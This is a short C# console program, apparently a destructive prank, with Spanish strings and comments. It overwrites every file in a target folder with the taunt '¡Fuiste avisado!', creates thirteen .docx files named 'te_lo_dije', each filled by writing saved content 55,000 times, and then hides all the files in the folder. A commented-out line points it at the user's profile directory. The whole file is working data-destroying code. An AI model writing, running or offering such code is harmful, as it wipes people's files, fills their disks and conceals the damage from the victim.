using System;

using System.IO;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main()
        {

            //DirectoryInfo direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\UNDERTALE");

            string aux = "", texto = @"¡Fuiste avisado! ¯\_(ツ)_/¯";

            //string rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\UNDERTALE";

            DirectoryInfo direccion = new DirectoryInfo(@"D:\Cole 2019\UNDERTALE");

            string rutaPrincipal = @"D:\Cole 2019\UNDERTALE";

            string rutaCompleta;

            int cont=0;

            bool unaVez = true, entra = true;

            do
            {

                Console.Clear();

                Console.WriteLine("Ejecutando...");

                cont++;

                rutaCompleta = rutaPrincipal + @"\te_lo_dije" + cont + ".docx";

                if (entra == true)
                {

                    if (direccion.GetFiles().Length == 0)
                    {

                        aux = texto;

                    }
                    else
                    {

                        foreach (FileInfo file in direccion.GetFiles())
                        { 
                            if (unaVez == true)
                            {

                                aux = File.ReadAllText(file.FullName); //aux guarda los valores originales.

                                unaVez = false;

                            }

                            File.WriteAllText(file.FullName, texto);

                        }

                    }

                    entra = false;

                }

                using (StreamWriter archivo = File.AppendText(rutaCompleta))         //se crea el archivo
                {

                    for (int i = 0; i < 55000; i++)
                    {

                        archivo.Write(aux);

                    }

                    archivo.Close();
                    
                }

            } while(cont <= 12);

            foreach (FileInfo file in direccion.GetFiles())
            {

                File.SetAttributes(file.FullName, FileAttributes.Hidden);

            }

        }
    }
}